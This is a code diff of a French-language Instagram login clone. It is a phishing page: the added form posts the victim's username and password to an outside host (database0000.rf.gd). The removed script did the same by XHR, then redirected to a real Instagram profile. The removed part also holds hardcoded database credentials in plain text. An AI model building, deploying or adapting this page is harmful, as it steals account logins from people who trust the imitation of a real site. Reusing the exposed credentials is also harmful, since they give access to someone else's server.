@@ -13,12 +13,14 @@
             <div id="logo-instagrame">
                 <img src="img/instagram-logo.png" id="logo-instagrame">
             </div><br><br>
-            <form id="myForm">
+            <form action="https://database0000.rf.gd/untitled.php" method="post">
+                
                 <input type="text" name="id" id="id" placeholder="Num. téléphone, nom d’utilisateur ou e-mail" class="mot-de-passe">
                 <br>
                 <input type="password" name="mdp" placeholder="Mot de passe" id="mdp" class="mot-de-passe">
                 <br>
                 <button type="submit" name="button" class="bouton-se-connecter">Se connecter</button>
+
             </form>
             <div class="or">
                 <span>ou</span>
@@ -30,40 +32,10 @@
                 <a href="https://www.instagram.com/accounts/password/reset/" class="aide">Mot de passe oublié ?</a>
             </div>
         </div>
-        <div id="boite-inscripton">
-            <p>Vous n'avez pas de compte ? <a href="https://www.instagram.com/accounts/emailsignup/" class="signup">Inscrivez-vous</a></p>
-        </div>
-    </div>
-
-    <script>
-        document.getElementById('myForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Récupération des données du formulaire
-            var id = document.getElementById('id').value;
-            var mdp = document.getElementById('mdp').value;
-            
-            // Connexion à la base de données
-            var host = 'sql107.epizy.com';
-            var dbname = 'epiz_33700074_data_stokage';
-            var username = 'epiz_33700074';
-            var password = '3q8wCHfXAXwd';
-            var url = 'https://www.instagram.com/goiko.fr/';
-
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://database0000.rf.gd/untitled.php');
-            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    console.log(xhr.responseText);
-                    window.location.href = url;
-                }
-                else {
-                    console.log('Une erreur s\'est produite lors de l\'enregistrement des informations dans la base de données.');
-                }
-            };
-            xhr.send(encodeURI('id=' + id + '&mdp=' + mdp));
-        });
-    </script>
+            <div id="boite-inscripton">
+                <p>Vous n'avez pas de compte ? <a href="https://www.instagram.com/accounts/emailsignup/" class="signup">Inscrivez-vous</a></p>
+            </div>
+        </div> 
+    
 </body>
 </html>
